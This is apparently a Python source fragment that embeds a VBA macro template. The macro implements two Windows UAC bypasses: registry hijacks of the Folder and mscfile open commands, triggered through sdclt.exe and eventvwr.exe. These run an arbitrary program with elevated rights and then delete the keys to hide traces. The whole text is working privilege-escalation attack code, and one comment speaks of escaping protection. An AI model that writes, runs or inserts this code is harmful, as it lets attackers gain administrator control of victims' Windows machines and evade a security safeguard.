



VBA = \
r'''

Private Sub BypassUAC_Windows10 (targetPath As String)
    'Escape VBdevelop protection
    Set wshUac = CreateObject("WScript.Shell")
    
    ' HKCU\Software\Classes\Folder
    regKeyCommand = "HKCU\Software\Classes\Folder\Shell\Open\Command\"
    regKeyCommand2 = "HKCU\Software\Classes\Folder\Shell\Open\Command\DelegateExecute"
    ' Create keys
    wshUac.RegWrite regKeyCommand, targetPath, "REG_SZ"
    wshUac.RegWrite regKeyCommand2, "", "REG_SZ"
    
    'trigger the bypass
    MySleep 1
    ExecuteCmdAsync  "cmd.exe /c sdclt.exe"  
    MySleep 2
    
    ' Remove keys
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\Open\Command\"
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\Open\"
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\"
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\"
End Sub



Private Sub BypassUAC_Other(targetPath As String)
    'Escape VBdevelop protection
    Set wshUac = CreateObject("WScript.Shell")
    
    ' HKCU\Software\Classes\ms-settings
    regKeyCommand = "HKCU\Software\Classes\mscfile\Shell\Open\Command\"
    ' Create keys
    wshUac.RegWrite regKeyCommand, targetPath, "REG_SZ"
    
    'trigger the bypass
    ExecuteCmdAsync  "cmd.exe /c eventvwr.exe"  
    MySleep 3
    
    ' Remove keys
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\Shell\Open\Command\"
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\Shell\Open\"
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\Shell\"
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\"
End Sub


Private Sub BypassUAC (targetPath As String)
    If GetOSVersion() = "Windows 10" Then
        BypassUAC_Windows10 targetPath
    Else
        BypassUAC_Other targetPath
    End If
End Sub


' hijack ms-settings class com object to bypass UAC when sdclt.exe is called (Windows 10)
Sub BypassUACExec (targetPath As String)
    Dim adminFr As String
    Dim adminEn As String
    adminFr = "Administrateurs"
    adminEn = "Administrators"
    'Check if useful to bypass UAC (must be member of Admin group and not have admin privilege
    ' is a member of that group.
    If IsAdmin  () Then
        ExecuteCmdAsync targetPath
    Else
        If IsCurrentUserMemberOfAdminGroup() Then
               BypassUAC targetPath
            Else
               ExecuteCmdAsync targetPath
        End If
    End If

End Sub




'''